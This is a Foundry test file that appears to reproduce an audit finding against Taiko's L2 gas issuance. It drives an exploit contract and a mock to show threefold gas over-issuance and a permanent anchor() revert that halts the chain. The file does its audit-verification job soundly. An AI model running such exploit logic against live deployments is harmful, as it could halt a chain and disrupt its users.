// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./31929-h-01-gas-issuance-is-inflated-and-will-halt-the-chain-or-lea.sol";

/*//////////////////////////////////////////////////////////////
    Taiko — gas issuance is inflated and will halt the chain (H-01, #31929)

    `_calc1559BaseFee` measures `numL1Blocks` against `lastSyncedBlock`, which
    only advances every BLOCK_SYNC_THRESHOLD (5) L1 blocks. Calling anchor()
    on 5 consecutive L1 blocks (2,3,4,5,6) with lastSyncedBlock pinned at 1
    issues gas as if (1+2+3+4+5)=15 blocks had elapsed instead of 5 — exactly
    3x over-issuance, matching the report's own PoC. The resulting gasExcess
    permanently diverges from a correct implementation's trajectory, which
    means block.basefee (set by a correctly-functioning off-chain component)
    would mismatch the contract's self-computed basefee forever —
    L2_BASEFEE_MISMATCH on every subsequent anchor() call — a liveness brick.

    - test_exploit: drives the cheatcode-free Exploit end to end (the
      report's own scenario numbers) and re-asserts both harms.
    - test_matchesReportsOwnPoC: standalone rebuild reproducing the report's
      EXACT assertion (`expectedIssuance*3 == issuance`).
    - test_livenessBrick_anchorRevertsForever: demonstrates the concrete
      consequence — once a correct off-chain basefee expectation is fed in,
      anchor() reverts with L2_BASEFEE_MISMATCH, and continues to revert on
      every subsequent block (the chain halts).
//////////////////////////////////////////////////////////////*/
contract TaikoGasIssuanceTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        assertEq(e.actualCumulativeIssuance(), e.correctCumulativeIssuance() * 3, "3x over-issuance");
        assertTrue(e.finalActualGasExcess() != e.finalCorrectGasExcess(), "gasExcess diverged");
    }

    /// @notice Standalone rebuild mirroring the report's own reduced PoC
    ///         EXACTLY: gasExcess=10, lastSyncedBlock=1, loop l1BlockId 2..6,
    ///         parentGasUsed=0, measuring cumulative issuance only (the
    ///         report's test disables the gasExcess update / basefee curve
    ///         entirely to isolate this exact comparison).
    function test_matchesReportsOwnPoC() public {
        uint32 gasTargetPerL1Block = 15 * 1e6 * 4; // 60,000,000
        uint64 lastSyncedBlock = 1;

        uint256 issuance;
        for (uint64 x = 2; x <= 6; x++) {
            uint256 numL1Blocks = x > lastSyncedBlock ? x - lastSyncedBlock : 0;
            issuance += numL1Blocks * gasTargetPerL1Block;
        }

        uint256 expectedIssuance = uint256(gasTargetPerL1Block) * 5;
        assertEq(expectedIssuance * 3, issuance, "matches the report's own assertEq exactly");
    }

    /// @notice Demonstrates the concrete liveness-brick consequence: once
    ///         `anchor()` is fed the CORRECT basefee (what a
    ///         correctly-functioning off-chain component would set as
    ///         block.basefee), it reverts — and every subsequent call reverts
    ///         too, since gasExcess has permanently diverged.
    function test_livenessBrick_anchorRevertsForever() public {
        uint64 initialGasExcess = 500_000_000;
        TaikoL2Like l2 = new TaikoL2Like(initialGasExcess, 1);
        TaikoL2Like.Config memory config = l2.getConfig();

        // Drive 3 real anchor() calls (feeding back the contract's OWN
        // computed basefee each time, exactly like the Exploit does) so
        // gasExcess has diverged from the correct trajectory.
        for (uint64 l1BlockId = 2; l1BlockId <= 4; l1BlockId++) {
            (uint256 buggyBasefee,) = _previewActual(l2, config, l1BlockId, 0);
            l2.anchor(l1BlockId, 0, buggyBasefee);
        }

        // Compute what a CORRECT off-chain component's basefee expectation
        // would be after the same 3 blocks, starting from the same initial
        // gasExcess.
        uint64 correctGasExcess = initialGasExcess;
        uint256 correctBasefee;
        for (uint256 i = 0; i < 3; i++) {
            (correctBasefee, correctGasExcess) = l2.previewCorrectAnchor(0, correctGasExcess);
        }

        // Feed that CORRECT expectation in as the next block's basefee: the
        // contract's own (diverged) computation no longer matches it.
        vm.expectRevert(TaikoL2Like.L2_BASEFEE_MISMATCH.selector);
        l2.anchor(5, 0, correctBasefee);

        // The chain is halted: retrying with the SAME correct expectation on the
        // next block also reverts — this is not a one-off, it is permanent.
        vm.expectRevert(TaikoL2Like.L2_BASEFEE_MISMATCH.selector);
        l2.anchor(6, 0, correctBasefee);
    }

    function _previewActual(TaikoL2Like l2, TaikoL2Like.Config memory config, uint64 l1BlockId, uint32 parentGasUsed)
        internal
        view
        returns (uint256 basefee_, uint64 gasExcess_)
    {
        uint64 lastSynced = l2.lastSyncedBlock();
        uint64 excessBefore = l2.gasExcess();
        uint256 excess = uint256(excessBefore) + parentGasUsed;
        uint256 numL1Blocks = l1BlockId > lastSynced ? l1BlockId - lastSynced : 0;
        if (numL1Blocks > 0) {
            uint256 issuance = numL1Blocks * config.gasTargetPerL1Block;
            excess = excess > issuance ? excess - issuance : 1;
        }
        gasExcess_ = uint64(excess > type(uint64).max ? type(uint64).max : excess);
        basefee_ = gasExcess_ == 0
            ? 1
            : (uint256(gasExcess_) * 1e18) / (uint256(config.basefeeAdjustmentQuotient) * config.gasTargetPerL1Block)
                + 1;
    }
}
